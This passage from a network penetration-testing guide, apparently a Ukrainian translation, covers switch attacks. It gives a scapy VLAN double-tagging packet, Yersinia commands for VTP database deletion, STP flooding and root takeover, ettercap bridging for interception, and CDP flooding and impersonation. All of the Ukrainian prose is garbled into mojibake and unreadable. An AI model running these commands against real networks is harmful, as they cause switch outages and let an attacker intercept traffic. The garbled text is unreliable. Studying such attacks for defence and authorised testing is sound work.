# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

–Ø–∫—â–æ —É –≤–∞—Å —î **–¥–æ—Å—Ç—É–ø –¥–æ –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞, –¥–æ —è–∫–æ–≥–æ –≤–∏ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –ø—ñ–¥–∫–ª—é—á–µ–Ω—ñ**, –≤–∏ –º–∞—î—Ç–µ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å **–æ–±—ñ–π—Ç–∏ —Å–µ–≥–º–µ–Ω—Ç–∞—Ü—ñ—é VLAN** –≤ –º–µ—Ä–µ–∂—ñ. –ü—Ä–æ—Å—Ç–æ **–ø–µ—Ä–µ–∫–ª—é—á—ñ—Ç—å –ø–æ—Ä—Ç —É —Ä–µ–∂–∏–º trunk** (—Ç–∞–∫–æ–∂ –≤—ñ–¥–æ–º–∏–π —è–∫ trunk), —Å—Ç–≤–æ—Ä—ñ—Ç—å –≤—ñ—Ä—Ç—É–∞–ª—å–Ω—ñ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∏ –∑ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–∞–º–∏ —Ü—ñ–ª—å–æ–≤–∏—Ö VLAN, —ñ –Ω–∞–ª–∞—à—Ç—É–π—Ç–µ IP-–∞–¥—Ä–µ—Å—É. –í–∏ –º–æ–∂–µ—Ç–µ —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ –∑–∞–ø–∏—Ç–∞—Ç–∏ –∞–¥—Ä–µ—Å—É –¥–∏–Ω–∞–º—ñ—á–Ω–æ (DHCP) –∞–±–æ –Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏ —ó—ó —Å—Ç–∞—Ç–∏—á–Ω–æ. –¶–µ –∑–∞–ª–µ–∂–∏—Ç—å –≤—ñ–¥ –≤–∏–ø–∞–¥–∫—É.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Layer 3 Private VLAN Bypass

–£ –ø–µ–≤–Ω–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞—Ö, —Ç–∞–∫–∏—Ö —è–∫ –≥–æ—Å—Ç—å–æ–≤—ñ –±–µ–∑–¥—Ä–æ—Ç–æ–≤—ñ –º–µ—Ä–µ–∂—ñ, **—ñ–∑–æ–ª—è—Ü—ñ—è –ø–æ—Ä—Ç—ñ–≤ (—Ç–∞–∫–æ–∂ –≤—ñ–¥–æ–º–∞ —è–∫ –ø—Ä–∏–≤–∞—Ç–Ω–∏–π VLAN)** —Ä–µ–∞–ª—ñ–∑—É—î—Ç—å—Å—è –¥–ª—è –∑–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ–º—É —Å–ø—ñ–ª–∫—É–≤–∞–Ω–Ω—é –∫–ª—ñ—î–Ω—Ç—ñ–≤, –ø—ñ–¥–∫–ª—é—á–µ–Ω–∏—Ö –¥–æ –±–µ–∑–¥—Ä–æ—Ç–æ–≤–æ—ó —Ç–æ—á–∫–∏ –¥–æ—Å—Ç—É–ø—É. –û–¥–Ω–∞–∫ –≤–∏—è–≤–ª–µ–Ω–æ —Ç–µ—Ö–Ω—ñ–∫—É, —è–∫–∞ –º–æ–∂–µ –æ–±—ñ–π—Ç–∏ —Ü—ñ –∑–∞—Ö–æ–¥–∏ —ñ–∑–æ–ª—è—Ü—ñ—ó. –¶—è —Ç–µ—Ö–Ω—ñ–∫–∞ –µ–∫—Å–ø–ª—É–∞—Ç—É—î –∞–±–æ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å –º–µ—Ä–µ–∂–µ–≤–∏—Ö ACL, –∞–±–æ —ó—Ö –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é, —â–æ –¥–æ–∑–≤–æ–ª—è—î IP-–ø–∞–∫–µ—Ç–∞–º –º–∞—Ä—à—Ä—É—Ç–∏–∑—É–≤–∞—Ç–∏—Å—è —á–µ—Ä–µ–∑ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä –¥–ª—è –¥–æ—Å—è–≥–Ω–µ–Ω–Ω—è —ñ–Ω—à–æ–≥–æ –∫–ª—ñ—î–Ω—Ç–∞ –≤ —Ç—ñ–π –∂–µ –º–µ—Ä–µ–∂—ñ.

–ê—Ç–∞–∫–∞ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è —à–ª—è—Ö–æ–º —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è **–ø–∞–∫–µ—Ç–∞, —è–∫–∏–π –º—ñ—Å—Ç–∏—Ç—å IP-–∞–¥—Ä–µ—Å—É —Ü—ñ–ª—å–æ–≤–æ–≥–æ –∫–ª—ñ—î–Ω—Ç–∞, –∞–ª–µ –∑ MAC-–∞–¥—Ä–µ—Å–æ—é –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä–∞**. –¶–µ –∑–º—É—à—É—î –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä –ø–æ–º–∏–ª–∫–æ–≤–æ –ø–µ—Ä–µ—Å–ª–∞—Ç–∏ –ø–∞–∫–µ—Ç —Ü—ñ–ª—å–æ–≤–æ–º—É –∫–ª—ñ—î–Ω—Ç—É. –¶–µ–π –ø—ñ–¥—Ö—ñ–¥ –ø–æ–¥—ñ–±–Ω–∏–π –¥–æ —Ç–æ–≥–æ, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ –∞—Ç–∞–∫–∞—Ö –ø–æ–¥–≤—ñ–π–Ω–æ–≥–æ —Ç–µ–≥—É–≤–∞–Ω–Ω—è, –¥–µ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ —Ö–æ—Å—Ç, –¥–æ—Å—Ç—É–ø–Ω–∏–π –∂–µ—Ä—Ç–≤—ñ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –±–µ–∑–ø–µ–∫–∏.

**–ö–ª—é—á–æ–≤—ñ –∫—Ä–æ–∫–∏ –∞—Ç–∞–∫–∏:**

1. **–°—Ç–≤–æ—Ä–µ–Ω–Ω—è –ø–∞–∫–µ—Ç–∞:** –ü–∞–∫–µ—Ç —Å–ø–µ—Ü—ñ–∞–ª—å–Ω–æ —Å—Ç–≤–æ—Ä—é—î—Ç—å—Å—è, —â–æ–± –≤–∫–ª—é—á–∞—Ç–∏ IP-–∞–¥—Ä–µ—Å—É —Ü—ñ–ª—å–æ–≤–æ–≥–æ –∫–ª—ñ—î–Ω—Ç–∞, –∞–ª–µ –∑ MAC-–∞–¥—Ä–µ—Å–æ—é –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä–∞.
2. **–ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –ø–æ–≤–µ–¥—ñ–Ω–∫–∏ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä–∞:** –°—Ç–≤–æ—Ä–µ–Ω–∏–π –ø–∞–∫–µ—Ç –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è –¥–æ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä–∞, —è–∫–∏–π, —á–µ—Ä–µ–∑ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é, –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—î –ø–∞–∫–µ—Ç –¥–æ —Ü—ñ–ª—å–æ–≤–æ–≥–æ –∫–ª—ñ—î–Ω—Ç–∞, –æ–±—Ö–æ–¥—è—á–∏ —ñ–∑–æ–ª—è—Ü—ñ—é, –∑–∞–±–µ–∑–ø–µ—á–µ–Ω—É –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è–º–∏ –ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ VLAN.

### VTP Attacks

VTP (VLAN Trunking Protocol) —Ü–µ–Ω—Ç—Ä–∞–ª—ñ–∑—É—î —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è VLAN. –í—ñ–Ω –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –Ω–æ–º–µ—Ä–∏ –≤–µ—Ä—Å—ñ–π –¥–ª—è –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö VLAN; –±—É–¥—å-—è–∫–∞ –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ—è –∑–±—ñ–ª—å—à—É—î —Ü–µ–π –Ω–æ–º–µ—Ä. –ö–æ–º—É—Ç–∞—Ç–æ—Ä–∏ –ø—Ä–∏–π–º–∞—é—Ç—å –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –∑ –≤–∏—â–∏–º–∏ –Ω–æ–º–µ—Ä–∞–º–∏ –≤–µ—Ä—Å—ñ–π, –æ–Ω–æ–≤–ª—é—é—á–∏ —Å–≤–æ—ó –≤–ª–∞—Å–Ω—ñ –±–∞–∑–∏ –¥–∞–Ω–∏—Ö VLAN.

#### VTP Domain Roles

* **VTP Server:** –ö–µ—Ä—É—î VLAN‚Äî—Å—Ç–≤–æ—Ä—é—î, –≤–∏–¥–∞–ª—è—î, –º–æ–¥–∏—Ñ—ñ–∫—É—î. –í—ñ–Ω —Ç—Ä–∞–Ω—Å–ª—é—î –æ–≥–æ–ª–æ—à–µ–Ω–Ω—è VTP —á–ª–µ–Ω–∞–º –¥–æ–º–µ–Ω—É.
* **VTP Client:** –û—Ç—Ä–∏–º—É—î –æ–≥–æ–ª–æ—à–µ–Ω–Ω—è VTP –¥–ª—è —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—ó —Å–≤–æ—î—ó –±–∞–∑–∏ –¥–∞–Ω–∏—Ö VLAN. –¶—è —Ä–æ–ª—å –æ–±–º–µ–∂–µ–Ω–∞ –≤—ñ–¥ –º–æ–¥–∏—Ñ—ñ–∫–∞—Ü—ñ–π –ª–æ–∫–∞–ª—å–Ω–∏—Ö –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π VLAN.
* **VTP Transparent:** –ù–µ –±–µ—Ä–µ —É—á–∞—Å—Ç—ñ –≤ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è—Ö VTP, –∞–ª–µ –ø–µ—Ä–µ—Å–∏–ª–∞—î –æ–≥–æ–ª–æ—à–µ–Ω–Ω—è VTP. –ù–µ –ø—ñ–¥–ª—è–≥–∞—î –∞—Ç–∞–∫–∞–º VTP, –ø—ñ–¥—Ç—Ä–∏–º—É—î –ø–æ—Å—Ç—ñ–π–Ω–∏–π –Ω–æ–º–µ—Ä –≤–µ—Ä—Å—ñ—ó –Ω—É–ª—å.

#### VTP Advertisement Types

* **Summary Advertisement:** –¢—Ä–∞–Ω—Å–ª—é—î—Ç—å—Å—è —Å–µ—Ä–≤–µ—Ä–æ–º VTP –∫–æ–∂–Ω—ñ 300 —Å–µ–∫—É–Ω–¥, –º—ñ—Å—Ç–∏—Ç—å –æ—Å–Ω–æ–≤–Ω—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –¥–æ–º–µ–Ω.
* **Subset Advertisement:** –ù–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è –ø—ñ—Å–ª—è –∑–º—ñ–Ω –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó VLAN.
* **Advertisement Request:** –í–∏–¥–∞—î—Ç—å—Å—è –∫–ª—ñ—î–Ω—Ç–æ–º VTP –¥–ª—è –∑–∞–ø–∏—Ç—É Summary Advertisement, –∑–∞–∑–≤–∏—á–∞–π —É –≤—ñ–¥–ø–æ–≤—ñ–¥—å –Ω–∞ –≤–∏—è–≤–ª–µ–Ω–Ω—è –≤–∏—â–æ–≥–æ –Ω–æ–º–µ—Ä–∞ –≤–µ—Ä—Å—ñ—ó –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó.

–í—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ VTP –º–æ–∂—É—Ç—å –±—É—Ç–∏ –µ–∫—Å–ø–ª—É–∞—Ç–æ–≤–∞–Ω—ñ –≤–∏–∫–ª—é—á–Ω–æ —á–µ—Ä–µ–∑ trunk –ø–æ—Ä—Ç–∏, –æ—Å–∫—ñ–ª—å–∫–∏ –æ–≥–æ–ª–æ—à–µ–Ω–Ω—è VTP —Ü–∏—Ä–∫—É–ª—é—é—Ç—å –ª–∏—à–µ —á–µ—Ä–µ–∑ –Ω–∏—Ö. –°—Ü–µ–Ω–∞—Ä—ñ—ó –ø—ñ—Å–ª—è –∞—Ç–∞–∫–∏ DTP –º–æ–∂—É—Ç—å –ø–µ—Ä–µ–π—Ç–∏ –¥–æ VTP. –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —Ç–∞–∫—ñ —è–∫ Yersinia, –º–æ–∂—É—Ç—å –ø–æ–ª–µ–≥—à–∏—Ç–∏ –∞—Ç–∞–∫–∏ VTP, –Ω–∞–º–∞–≥–∞—é—á–∏—Å—å –∑–Ω–∏—â–∏—Ç–∏ –±–∞–∑—É –¥–∞–Ω–∏—Ö VLAN, –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –ø–æ—Ä—É—à—É—é—á–∏ –º–µ—Ä–µ–∂—É.

–ü—Ä–∏–º—ñ—Ç–∫–∞: –¶–µ –æ–±–≥–æ–≤–æ—Ä–µ–Ω–Ω—è —Å—Ç–æ—Å—É—î—Ç—å—Å—è –≤–µ—Ä—Å—ñ—ó VTP 1 (VTPv1).
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
–£ –≥—Ä–∞—Ñ—ñ—á–Ω–æ–º—É —Ä–µ–∂–∏–º—ñ Yersinia –≤–∏–±–µ—Ä—ñ—Ç—å –æ–ø—Ü—ñ—é –≤–∏–¥–∞–ª–µ–Ω–Ω—è –≤—Å—ñ—Ö VTP VLAN, —â–æ–± –æ—á–∏—Å—Ç–∏—Ç–∏ –±–∞–∑—É –¥–∞–Ω–∏—Ö VLAN.

### –ê—Ç–∞–∫–∏ STP

**–Ø–∫—â–æ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∑–∞—Ö–æ–ø–∏—Ç–∏ –∫–∞–¥—Ä–∏ BPDU –Ω–∞ —Å–≤–æ—ó—Ö —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞—Ö, –º–∞–ª–æ–π–º–æ–≤—ñ—Ä–Ω–æ, —â–æ –≤–∏ –¥–æ—Å—è–≥–Ω–µ—Ç–µ —É—Å–ø—ñ—Ö—É –≤ –∞—Ç–∞—Ü—ñ STP.**

#### **STP BPDU DoS**

–í—ñ–¥–ø—Ä–∞–≤–∫–∞ –≤–µ–ª–∏–∫–æ—ó –∫—ñ–ª—å–∫–æ—Å—Ç—ñ BPDUs TCP (–°–ø–æ–≤—ñ—â–µ–Ω–Ω—è –ø—Ä–æ –∑–º—ñ–Ω—É —Ç–æ–ø–æ–ª–æ–≥—ñ—ó) –∞–±–æ Conf (BPDUs, —è–∫—ñ –Ω–∞–¥—Å–∏–ª–∞—é—Ç—å—Å—è –ø—ñ–¥ —á–∞—Å —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ç–æ–ø–æ–ª–æ–≥—ñ—ó) –ø–µ—Ä–µ–≤–∞–Ω—Ç–∞–∂—É—î –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∏, —ñ –≤–æ–Ω–∏ –ø–µ—Ä–µ—Å—Ç–∞—é—Ç—å –ø—Ä–∞—Ü—é–≤–∞—Ç–∏ –Ω–∞–ª–µ–∂–Ω–∏–º —á–∏–Ω–æ–º.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

–ö–æ–ª–∏ –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è TCP, —Ç–∞–±–ª–∏—Ü—è CAM –∫–æ–º—É—Ç–∞—Ç–æ—Ä—ñ–≤ –±—É–¥–µ –≤–∏–¥–∞–ª–µ–Ω–∞ —á–µ—Ä–µ–∑ 15 —Å–µ–∫—É–Ω–¥. –ü–æ—Ç—ñ–º, —è–∫—â–æ –≤–∏ –ø–æ—Å—Ç—ñ–π–Ω–æ –Ω–∞–¥—Å–∏–ª–∞—î—Ç–µ —Ç–∞–∫—ñ –ø–∞–∫–µ—Ç–∏, —Ç–∞–±–ª–∏—Ü—è CAM –±—É–¥–µ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞—Ç–∏—Å—è –±–µ–∑–ø–µ—Ä–µ—Ä–≤–Ω–æ (–∞–±–æ –∫–æ–∂–Ω—ñ 15 —Å–µ–∫—É–Ω–¥), —ñ –∫–æ–ª–∏ –≤–æ–Ω–∞ –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞—î—Ç—å—Å—è, –∫–æ–º—É—Ç–∞—Ç–æ—Ä –ø–æ–≤–æ–¥–∏—Ç—å—Å—è —è–∫ —Ö–∞–±.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ —ñ–º—ñ—Ç—É—î –ø–æ–≤–µ–¥—ñ–Ω–∫—É –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞, —â–æ–± —Å—Ç–∞—Ç–∏ –∫–æ—Ä–µ–Ω–µ–º STP –º–µ—Ä–µ–∂—ñ. –¢–æ–¥—ñ –±—ñ–ª—å—à–µ –¥–∞–Ω–∏—Ö –ø—Ä–æ—Ö–æ–¥–∏—Ç–∏–º–µ —á–µ—Ä–µ–∑ –Ω—å–æ–≥–æ. –¶–µ —Ü—ñ–∫–∞–≤–æ, –∫–æ–ª–∏ –≤–∏ –ø—ñ–¥–∫–ª—é—á–µ–Ω—ñ –¥–æ –¥–≤–æ—Ö —Ä—ñ–∑–Ω–∏—Ö –∫–æ–º—É—Ç–∞—Ç–æ—Ä—ñ–≤.\
–¶–µ —Ä–æ–±–∏—Ç—å—Å—è —à–ª—è—Ö–æ–º –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ –ø–∞–∫–µ—Ç—ñ–≤ BPDUs CONF, —è–∫—ñ —Å—Ç–≤–µ—Ä–¥–∂—É—é—Ç—å, —â–æ –∑–Ω–∞—á–µ–Ω–Ω—è **–ø—Ä—ñ–æ—Ä–∏—Ç–µ—Ç—É** –º–µ–Ω—à–µ, –Ω—ñ–∂ —Ñ–∞–∫—Ç–∏—á–Ω–∏–π –ø—Ä—ñ–æ—Ä–∏—Ç–µ—Ç —Ñ–∞–∫—Ç–∏—á–Ω–æ–≥–æ –∫–æ—Ä–µ–Ω–µ–≤–æ–≥–æ –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**–Ø–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –ø—ñ–¥–∫–ª—é—á–µ–Ω–∏–π –¥–æ 2 –∫–æ–º—É—Ç–∞—Ç–æ—Ä—ñ–≤, –≤—ñ–Ω –º–æ–∂–µ —Å—Ç–∞—Ç–∏ –∫–æ—Ä–µ–Ω–µ–º –Ω–æ–≤–æ–≥–æ –¥–µ—Ä–µ–≤–∞, —ñ –≤–µ—Å—å —Ç—Ä–∞—Ñ—ñ–∫ –º—ñ–∂ —Ü–∏–º–∏ –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞–º–∏ –ø—Ä–æ—Ö–æ–¥–∏—Ç–∏–º–µ —á–µ—Ä–µ–∑ –Ω—å–æ–≥–æ** (–±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–æ –∞—Ç–∞–∫—É MITM).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP Attacks

CISCO Discovery Protocol (CDP) —î –≤–∞–∂–ª–∏–≤–∏–º –¥–ª—è –∑–≤'—è–∑–∫—É –º—ñ–∂ –ø—Ä–∏—Å—Ç—Ä–æ—è–º–∏ CISCO, —â–æ –¥–æ–∑–≤–æ–ª—è—î —ó–º **—ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫—É–≤–∞—Ç–∏ –æ–¥–∏–Ω –æ–¥–Ω–æ–≥–æ —Ç–∞ –¥—ñ–ª–∏—Ç–∏—Å—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∏–º–∏ –¥–µ—Ç–∞–ª—è–º–∏**.

#### Passive Data Collection <a href="#id-0e0f" id="id-0e0f"></a>

CDP –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–æ –Ω–∞ —Ç—Ä–∞–Ω—Å–ª—è—Ü—ñ—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó —á–µ—Ä–µ–∑ –≤—Å—ñ –ø–æ—Ä—Ç–∏, —â–æ –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ —Ä–∏–∑–∏–∫—É –±–µ–∑–ø–µ–∫–∏. –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫, –ø—ñ–¥–∫–ª—é—á–∏–≤—à–∏—Å—å –¥–æ –ø–æ—Ä—Ç—É –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞, –º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –º–µ—Ä–µ–∂–µ–≤—ñ –∞–Ω–∞–ª—ñ–∑–∞—Ç–æ—Ä–∏, —Ç–∞–∫—ñ —è–∫ **Wireshark**, **tcpdump** –∞–±–æ **Yersinia**. –¶—è –¥—ñ—è –º–æ–∂–µ —Ä–æ–∑–∫—Ä–∏—Ç–∏ —á—É—Ç–ª–∏–≤—ñ –¥–∞–Ω—ñ –ø—Ä–æ –º–µ—Ä–µ–∂–µ–≤–∏–π –ø—Ä–∏—Å—Ç—Ä—ñ–π, –≤–∫–ª—é—á–∞—é—á–∏ –π–æ–≥–æ –º–æ–¥–µ–ª—å —Ç–∞ –≤–µ—Ä—Å—ñ—é Cisco IOS, —è–∫—É –≤—ñ–Ω –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î. –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –ø–æ—Ç—ñ–º –Ω–∞—Ü—ñ–ª–∏—Ç–∏—Å—è –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –≤ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω—ñ–π –≤–µ—Ä—Å—ñ—ó Cisco IOS.

#### Inducing CDP Table Flooding <a href="#id-0d6a" id="id-0d6a"></a>

–ë—ñ–ª—å—à –∞–≥—Ä–µ—Å–∏–≤–Ω–∏–π –ø—ñ–¥—Ö—ñ–¥ –ø–æ–ª—è–≥–∞—î –≤ –∑–∞–ø—É—Å–∫—É –∞—Ç–∞–∫–∏ –≤—ñ–¥–º–æ–≤–∏ –≤ –æ–±—Å–ª—É–≥–æ–≤—É–≤–∞–Ω–Ω—ñ (DoS), –ø–µ—Ä–µ–≤–∞–Ω—Ç–∞–∂—É—é—á–∏ –ø–∞–º'—è—Ç—å –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞, –≤–∏–¥–∞—é—á–∏ —Å–µ–±–µ –∑–∞ –ª–µ–≥—ñ—Ç–∏–º–Ω—ñ –ø—Ä–∏—Å—Ç—Ä–æ—ó CISCO. –ù–∏–∂—á–µ –Ω–∞–≤–µ–¥–µ–Ω–æ –ø–æ—Å–ª—ñ–¥–æ–≤–Ω—ñ—Å—Ç—å –∫–æ–º–∞–Ω–¥ –¥–ª—è —ñ–Ω—ñ—Ü—ñ—é–≤–∞–Ω–Ω—è —Ç–∞–∫–æ—ó –∞—Ç–∞–∫–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Yersinia, —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—É –¥–ª—è —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è –º–µ—Ä–µ–∂—ñ:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
–ü—ñ–¥ —á–∞—Å —Ü—ñ—î—ó –∞—Ç–∞–∫–∏ –ø—Ä–æ—Ü–µ—Å–æ—Ä –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞ —Ç–∞ —Ç–∞–±–ª–∏—Ü—è —Å—É—Å—ñ–¥—ñ–≤ CDP –∑–∞–∑–Ω–∞—é—Ç—å –≤–µ–ª–∏–∫–æ–≥–æ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ —Ç–æ–≥–æ, —â–æ —á–∞—Å—Ç–æ –Ω–∞–∑–∏–≤–∞—é—Ç—å **‚Äú–ø–∞—Ä–∞–ª—ñ—á–µ–º –º–µ—Ä–µ–∂—ñ‚Äù** —á–µ—Ä–µ–∑ –Ω–∞–¥–º—ñ—Ä–Ω–µ —Å–ø–æ–∂–∏–≤–∞–Ω–Ω—è —Ä–µ—Å—É—Ä—Å—ñ–≤.

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ [**scapy**](https://github.com/secdev/scapy/). –û–±–æ–≤'—è–∑–∫–æ–≤–æ –≤—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å –π–æ–≥–æ –∑ –ø–∞–∫–µ—Ç–æ–º `scapy/contrib`.

### –ê—Ç–∞–∫–∏ VoIP —Ç–∞ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç VoIP Hopper

VoIP —Ç–µ–ª–µ—Ñ–æ–Ω–∏, —è–∫—ñ –≤—Å–µ –±—ñ–ª—å—à–µ —ñ–Ω—Ç–µ–≥—Ä—É—é—Ç—å—Å—è –∑ IoT –ø—Ä–∏—Å—Ç—Ä–æ—è–º–∏, –ø—Ä–æ–ø–æ–Ω—É—é—Ç—å —Ñ—É–Ω–∫—Ü—ñ—ó, —Ç–∞–∫—ñ —è–∫ –≤—ñ–¥–∫—Ä–∏—Ç—Ç—è –¥–≤–µ—Ä–µ–π –∞–±–æ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è —Ç–µ—Ä–º–æ—Å—Ç–∞—Ç–∞–º–∏ —á–µ—Ä–µ–∑ —Å–ø–µ—Ü—ñ–∞–ª—å–Ω—ñ —Ç–µ–ª–µ—Ñ–æ–Ω–Ω—ñ –Ω–æ–º–µ—Ä–∏. –û–¥–Ω–∞–∫ —Ü—è —ñ–Ω—Ç–µ–≥—Ä–∞—Ü—ñ—è –º–æ–∂–µ —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ —Ä–∏–∑–∏–∫–∏ –±–µ–∑–ø–µ–∫–∏.

–Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç [**voiphopper**](http://voiphopper.sourceforge.net) –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –µ–º—É–ª—è—Ü—ñ—ó VoIP —Ç–µ–ª–µ—Ñ–æ–Ω—É –≤ —Ä—ñ–∑–Ω–∏—Ö —Å–µ—Ä–µ–¥–æ–≤–∏—â–∞—Ö (Cisco, Avaya, Nortel, Alcatel-Lucent). –í—ñ–Ω –≤–∏—è–≤–ª—è—î VLAN ID –≥–æ–ª–æ—Å–æ–≤–æ—ó –º–µ—Ä–µ–∂—ñ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –ø—Ä–æ—Ç–æ–∫–æ–ª–∏, —Ç–∞–∫—ñ —è–∫ CDP, DHCP, LLDP-MED —Ç–∞ 802.1Q ARP.

